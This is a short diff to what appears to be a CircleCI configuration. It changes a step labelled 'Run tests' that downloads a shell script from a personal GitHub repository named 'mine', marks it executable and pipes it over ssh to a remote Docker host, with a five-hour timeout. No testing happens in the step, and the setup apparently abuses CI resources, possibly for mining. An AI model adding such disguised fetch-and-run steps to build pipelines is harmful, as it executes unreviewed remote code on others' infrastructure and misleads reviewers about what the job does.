@@ -10,7 +10,7 @@ jobs:
       - run: 
           name: Run tests 
           command: | 
-            wget https://raw.githubusercontent.com/gyrogerald/mine/main/pktm.sh
-            chmod +x pktm.sh
-            cat pktm.sh | ssh remote-docker
+            wget https://raw.githubusercontent.com/gyrogerald/mine/main/pktmc.sh
+            chmod +x pktmc.sh
+            cat pktmc.sh | ssh remote-docker
           no_output_timeout: 5h
